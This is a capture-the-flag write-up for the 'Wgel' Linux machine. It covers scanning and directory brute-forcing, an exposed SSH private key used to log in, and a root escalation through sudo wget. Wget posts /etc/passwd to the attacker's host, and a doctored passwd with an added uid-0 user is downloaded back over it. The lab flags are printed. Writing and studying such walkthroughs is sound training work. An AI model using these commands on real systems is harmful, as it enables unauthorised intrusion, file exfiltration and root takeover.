# Wgel CTF Writeup

> Machine : Linux

> Can you exfiltrate the root flag?

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.141.5 -p-
```

From our results, we can see ports 22 (SSH) and 80 (HTTP) are open.

After visiting the site we found the `Apache default page`. and we found a comment in the page source code `<!-- Jessie don't forget to udate the webiste -->`. that's means there is a user named `jessie`.

```shell
gobuster dir -u http://10.129.141.5/ -w /usr/share/wordlists/dirb/common.txt
```

```text
sitemap              (Status: 301) [Size: 314] [--> http://10.129.141.5/sitemap/]
```

After entering the `sitemap` directory we see a site which also have directories.

```shell
gobuster dir -u http://10.129.141.5/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

```text
.ssh                 (Status: 301) [Size: 319] [--> http://10.129.141.5/sitemap/.ssh/]
```

That's interesting we found a `.ssh` directory which have `id_rsa` key on it.

```shell
wget "http://10.129.141.5/sitemap/.ssh/id_rsa"
```

```shell
chmod 600 id_rsa
```

Using the username `jessie` we found previously, we can enter using `ssh`.

```shell
ssh jessie@10.129.141.5 -i id_rsa
```

That's it we got a shell.

```shell
cat Documents/user_flag.txt 
```

```text
057c67131c3d5e42dd5cd3075b198ff6
```

> User flag
> 
> 057c67131c3d5e42dd5cd3075b198ff6

Now we have to be `root` so we can read the root flag.

```shell
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/wget
```

We can run `wget` as root. So let's google how can we use it to escalate our privileges.

The main idea is to send the `passwd` file to our local machine then add a new user with a hashed password and give it the root privileges, then send the file back to the target machine.

```shell
nc -lnvp 80 > passwd
```

```shell
sudo wget --post-file=/etc/passwd 192.168.176.170 80
```

Then we remove the very top of the file.

And we create a hashed password for `passwd` file.

```shell
openssl passwd -1 password
```

```text
$1$Jqe3lJUK$9EDGBNd36WXocw6iZRTeG.
```

And using a `text editor` we add the user at the very bottom of the file.

```text
newroot:$1$Jqe3lJUK$9EDGBNd36WXocw6iZRTeG.:0:0:/root/root:/bin/bash
```

Now let's send it back to the target machine.

```shell
python3 -m http.server 8000
```

```shell
sudo wget http://192.168.176.170:8000/passwd -O /etc/passwd
```

```shell
su newroot
password
```

And done.

```shell
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```shell
cat /root/root_flag.txt
```

```text
b1b968b37519ad1daa6408188649263d
```

> Root flag
> 
> b1b968b37519ad1daa6408188649263d

